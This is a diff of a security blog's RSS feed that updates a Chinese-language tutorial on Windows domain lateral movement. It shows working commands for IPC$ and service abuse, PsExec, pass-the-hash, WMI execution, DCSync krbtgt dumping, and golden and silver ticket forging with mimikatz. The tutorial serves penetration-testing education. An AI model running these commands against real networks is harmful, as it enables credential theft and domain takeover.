@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Wed, 01 Jun 2022 18:17:13 &#43;0800</lastBuildDate>
+        <lastBuildDate>Tue, 14 Jun 2022 12:58:44 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://blog.wh1sper.com/rss.xml" />
         
@@ -40,11 +40,11 @@
                 
                     <description>&lt;h2 id=&#34;ipc连接&#34;&gt;IPC连接&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;条件：
-1、目标机开启了139和445端口；
-2、目标主机管理员开启了ipc$默认共享；
-3、知道目标机的（权限足够的）账户密码。
-4、NT或以上操作系统&lt;/p&gt;
+&lt;p&gt;条件：&lt;/p&gt;
+&lt;p&gt;1、目标机开启了139和445端口；&lt;/p&gt;
+&lt;p&gt;2、目标主机管理员开启了ipc$默认共享；&lt;/p&gt;
+&lt;p&gt;3、知道目标机的（权限足够的）账户密码。&lt;/p&gt;
+&lt;p&gt;4、NT或以上操作系统&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;code&gt;IPC$(Internet Process Connection)&lt;/code&gt;是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。&lt;/p&gt;
 &lt;p&gt;利用&lt;code&gt;IPC$&lt;/code&gt;,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。&lt;/p&gt;
@@ -99,9 +99,9 @@ schtasks /delete /s 192.168.10.2 /tn &amp;quot;backdoor&amp;quot; /f
 at \\192.168.10.2 1 /delete //删除ID为1的计划任务
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;windows服务&#34;&gt;Windows服务&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;条件：
-当前跳板机用户具有管理员权限(因为要创建服务)。
-与目标机器已经建立ipc连接&lt;/p&gt;
+&lt;p&gt;条件：&lt;/p&gt;
+&lt;p&gt;1、当前跳板机用户具有管理员权限(因为要创建服务)。&lt;/p&gt;
+&lt;p&gt;2、与目标机器已经建立ipc连接&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;1.建立IPC连接&lt;/p&gt;
 &lt;p&gt;2.拷贝木马到目标机器&lt;/p&gt;
@@ -119,19 +119,19 @@ at \\192.168.10.2 1 /delete //删除ID为1的计划任务
 sc \\WIN-ENS2VR5TR3N start unablefirewall
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;通过smb服务横向移动&#34;&gt;通过smb服务横向移动&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;利用条件
-1、445端口开放
-2、知道账号密码明文或hash&lt;/p&gt;
+&lt;p&gt;利用条件&lt;/p&gt;
+&lt;p&gt;1、445端口开放&lt;/p&gt;
+&lt;p&gt;2、知道账号密码明文或hash&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;利用 SMB 服务可以通过明文或 hash 传递（PTH）来远程执行。&lt;/p&gt;
 &lt;h3 id=&#34;明文传递&#34;&gt;明文传递&lt;/h3&gt;
 &lt;h4 id=&#34;psexecexe微软官方工具&#34;&gt;PsExec.exe(微软官方工具)&lt;/h4&gt;
 &lt;blockquote&gt;
-&lt;p&gt;使用条件
-1.对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名
-2.对方未开启防火墙
-3.如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。
-4.如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。&lt;/p&gt;
+&lt;p&gt;使用条件&lt;/p&gt;
+&lt;p&gt;1.对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名&lt;/p&gt;
+&lt;p&gt;2.对方未开启防火墙&lt;/p&gt;
+&lt;p&gt;3.如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。&lt;/p&gt;
+&lt;p&gt;4.如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;执行原理(会留下大量日志)：&lt;/p&gt;
 &lt;ol&gt;
@@ -153,13 +153,13 @@ psexec.exe \\192.168.10.2 -s cmd.exe -acceptcula
 -s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell&lt;/p&gt;
 &lt;h3 id=&#34;pth-哈希传递&#34;&gt;PTH-哈希传递&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;利用条件
-1、在工作组环境中：
-Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
-Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问
-2、在域环境中：
-只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器
-如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1&lt;/p&gt;
+&lt;p&gt;利用条件&lt;/p&gt;
+&lt;p&gt;1、在工作组环境中：&lt;/p&gt;
+&lt;p&gt;Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。&lt;/p&gt;
+&lt;p&gt;Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问&lt;/p&gt;
+&lt;p&gt;2、在域环境中：&lt;/p&gt;
+&lt;p&gt;只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器&lt;/p&gt;
+&lt;p&gt;如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h4 id=&#34;psexecpy-pth&#34;&gt;psexec.py-PTH&lt;/h4&gt;
 &lt;blockquote&gt;
@@ -205,10 +205,10 @@ sekurlsa::pth /user:administrator /domain:workgroup /ntlm:852a844adfce18f66009b4
 &lt;p&gt;“自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是攻击者逐渐开始使用WMI进行横向移动。通过渗透测试发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。因为在这个过程中不会产生日志，所以，对网络管理员来说增加了攻击溯源的成本。而对攻击者来说，其恶意行为被发现的可能性有所降低、隐蔽性有所提高。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。”&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
-&lt;p&gt;使用条件
-1、WMI服务开启，端口135，默认开启。
-2、防火墙允许135、445等端口通信。
-3、知道目标机的账户密码。&lt;/p&gt;
+&lt;p&gt;使用条件&lt;/p&gt;
+&lt;p&gt;1、WMI服务开启，端口135，默认开启。&lt;/p&gt;
+&lt;p&gt;2、防火墙允许135、445等端口通信。&lt;/p&gt;
+&lt;p&gt;3、知道目标机的账户密码。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;执行命令：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:191.168.52.136 /user:xxxx /password:xxxxx  process call create &amp;quot;cmd.exe /c ipconfig&amp;gt;d:\result.txt&amp;quot;
@@ -273,80 +273,263 @@ wmic qfe get Caption,Description,HotFixID,IntsalledOn
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic product get name,version
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;远程桌面连接
 使用WMIC命令开启远程计算机的远程桌面连接：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&amp;quot;&amp;quot;) CALL SetAllowTSConnections 1
-// wmic /node:&amp;quot;[full machine name]&amp;quot; /USER:&amp;quot;[domain]\[username]&amp;quot; PATH win32_terminalservicesetting WHERE (__Class!=&amp;quot;&amp;quot;) CALL SetAllowTSConnections 1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;共享管理&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic share list brief
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
+// wmic /node:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[full machine name]&amp;#34;&lt;/span&gt; /USER:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[domain]\[username]&amp;#34;&lt;/span&gt; PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;共享管理&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmic share list brief
 wmic share get name,path,status
 
-wmic share call create &amp;quot;&amp;quot;,&amp;quot;test&amp;quot;,&amp;quot;3&amp;quot;,&amp;quot;TestShareName&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;c:\whoami&amp;quot;,0
-(可使用 WMIC SHARE CALL Create /? 查看create后的参数类型)
+wmic share call create &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;TestShareName&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\whoami&amp;#34;&lt;/span&gt;,0
+&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;可使用 WMIC SHARE CALL Create /? 查看create后的参数类型&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 // 建立共享
 
-wmic share where &amp;quot;name=&#39;C$&#39;&amp;quot; call delete
-wmic share where &amp;quot;path=&#39;c:\test&#39;&amp;quot; delete
+wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;name=&amp;#39;C$&amp;#39;&amp;#34;&lt;/span&gt; call delete
+wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&amp;#39;&amp;#34;&lt;/span&gt; delete
 // 删除共享
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wmiexec&#34;&gt;wmiexec&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;wmiexec&#34;&gt;wmiexec&lt;/h3&gt;
 &lt;p&gt;要执行命令并回显请使用wmiexec.py，⽤445端口传回显：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python wmiexec.py administrator:Liu78963@192.168.183.130
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;python wmiexec.py administrator:Liu78963@192.168.183.130
 // python wmiexec.py 用户名:密码@目标IP
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;指定-hashes选项的话，则可进行哈希传递。&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;指定-hashes选项的话，则可进行哈希传递。&lt;/p&gt;
 &lt;p&gt;exe版本命令与wmiexec.py一模一样。在跳板机上上传wmiexec.exe并运行如下命令获取目标系统192.168.52.138的shell：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmiexec.exe administrator:Liu78963@192.168.183.130
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wmiexecvbs&#34;&gt;wmiexec.vbs&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmiexec.exe administrator:Liu78963@192.168.183.130
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;wmiexecvbs&#34;&gt;wmiexec.vbs&lt;/h3&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs&#34;&gt;https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式Shell。&lt;/p&gt;
 &lt;p&gt;wmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。&lt;/p&gt;
 &lt;h2 id=&#34;ptk-密钥传递&#34;&gt;PTK-密钥传递&lt;/h2&gt;
 &lt;p&gt;即 Pass The Key ，当系统安装了 KB2871997 补丁且禁用了 NTLM 的时候，那我们抓取到的 ntlm hash. 也就失去了作用，但是可以通过 pass the key 的攻击方式获得权限。&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;利用条件
-1、目标主机打过KB2871997
-2、所以必须使用SID值为500的用户&lt;/p&gt;
+&lt;p&gt;利用条件&lt;/p&gt;
+&lt;p&gt;1、目标主机打过KB2871997&lt;/p&gt;
+&lt;p&gt;2、所以必须使用SID值为500的用户&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz sekurlsa::ekeys
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz sekurlsa::ekeys
 //获取用户的aes key
-sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&amp;quot;
+sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
 //注入aes key，成功后会返回一个cmd
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ptt-票据传递&#34;&gt;PTT-票据传递&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ptt-票据传递&#34;&gt;PTT-票据传递&lt;/h2&gt;
 &lt;h3 id=&#34;ms14-068&#34;&gt;MS14-068&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;利用条件
-1.域控没有打MS14-068的补丁(KB3011780)
-2.拿下一台加入域的计算机
-3.有这台域内计算机的域用户密码和Sid&lt;/p&gt;
+&lt;p&gt;利用条件&lt;/p&gt;
+&lt;p&gt;1.域控没有打MS14-068的补丁(KB3011780)&lt;/p&gt;
+&lt;p&gt;2.拿下一台加入域的计算机，并且能dump出某一域成员的用户名，密码，SID等值&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;域用户到域控的横向移动&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&lt;/a&gt;
-&lt;a href=&#34;https://www.cnblogs.com/yuzly/p/10859520.html&#34;&gt;https://www.cnblogs.com/yuzly/p/10859520.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;域用户hack在域成员主机A上登录过，域成员主机A的管理员通过&lt;code&gt;mimikatz&lt;/code&gt;得到了域用户hack的用户名，密码，SID等值，而且域控存在&lt;code&gt;MS14-068&lt;/code&gt;漏洞，现在域成员主机A想通过&lt;code&gt;MS14-068&lt;/code&gt;漏洞访问域控。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/-mo-/p/11890539.html&#34;&gt;https://www.cnblogs.com/-mo-/p/11890539.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/yuzly/p/10859520.html&#34;&gt;https://www.cnblogs.com/yuzly/p/10859520.html&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;黄金票据&#34;&gt;黄金票据&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;利用条件
-1.域名称
-2.域的SID值
-3.域的KRBTGT账户密码HASH（通常需要SYSTEM权限才能dump）
-4.伪造用户名，可以是任意的&lt;/p&gt;
+&lt;p&gt;利用条件&lt;/p&gt;
+&lt;p&gt;1.域名称&lt;/p&gt;
+&lt;p&gt;2.域的SID值&lt;/p&gt;
+&lt;p&gt;3.域的KRBTGT账户密码HASH（通常需要SYSTEM权限才能dump）&lt;/p&gt;
+&lt;p&gt;4.伪造用户名，可以是任意的&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;到任一域用户的横向移动&lt;/p&gt;
-&lt;h3 id=&#34;白银票据&#34;&gt;白银票据&lt;/h3&gt;
+&lt;p&gt;kerberos协议原理参考&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41874930/article/details/108124366&#34;&gt;NTML认证与kerberos认证与PAC相关知识&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/202206141128058.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。&lt;/p&gt;
+&lt;p&gt;首先获取krbtgt的用户hash:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::dcsync /domain:xx.com /user:krbtgt&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
+
+
+kerberos::ptt test.kiribi #导入刚才生成的票据
+
+
+&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; \\dc.abc.com\c$  #导入成功后可获取域管权限
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;白银票据&#34;&gt;白银票据&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;利用条件
-1.域名称
-2.域的SID值
-3.域中的Server服务器账户的NTLM-Hash
-4.伪造的用户名，可以是任意用户名.
-5.目标服务器上面的kerberos服务&lt;/p&gt;
+&lt;p&gt;利用条件&lt;/p&gt;
+&lt;p&gt;1.域名称&lt;/p&gt;
+&lt;p&gt;2.域的SID值&lt;/p&gt;
+&lt;p&gt;3.域中的Server服务器账户的NTLM-Hash&lt;/p&gt;
+&lt;p&gt;4.伪造的用户名，可以是任意用户名.&lt;/p&gt;
+&lt;p&gt;5.目标服务器上面需要访问的kerberos服务&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;到特定服务的横向移动&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/202206141131526.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以伪造的服务&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;服务名称&lt;/th&gt;
+&lt;th&gt;同时需要的服务&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;WMI&lt;/td&gt;
+&lt;td&gt;HOST RPCSS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PowerShell Remoting&lt;/td&gt;
+&lt;td&gt;HOST HTTP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;WinRM&lt;/td&gt;
+&lt;td&gt;HOST HTTP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Scheduled Tasks&lt;/td&gt;
+&lt;td&gt;HOST&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Windows File Share (CIFS)&lt;/td&gt;
+&lt;td&gt;CIFS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;LDAP operations includingMimikatz DCSync&lt;/td&gt;
+&lt;td&gt;LDAP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Windows Remote Server Administration Tools&lt;/td&gt;
+&lt;td&gt;RPCSS LDAP CIFS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;服务说明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Silver Ticket连接到具有管理员权限Windows计算机上的WMI
+为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行&lt;/p&gt;
+&lt;p&gt;为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;具有管理员权限的Windows计算机（HOST）的Silver Ticket&lt;/p&gt;
+&lt;p&gt;创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。&lt;/p&gt;
+&lt;p&gt;注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows共享（CIFS）管理访问的Silver Ticket&lt;/p&gt;
+&lt;p&gt;为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。&lt;/p&gt;
+&lt;p&gt;注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括&lt;code&gt;c$&lt;/code&gt;共享，我们能够将文件拷贝到共享文件中。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Silver Ticket连接到具有管理员权限Windows计算机上的LDAP
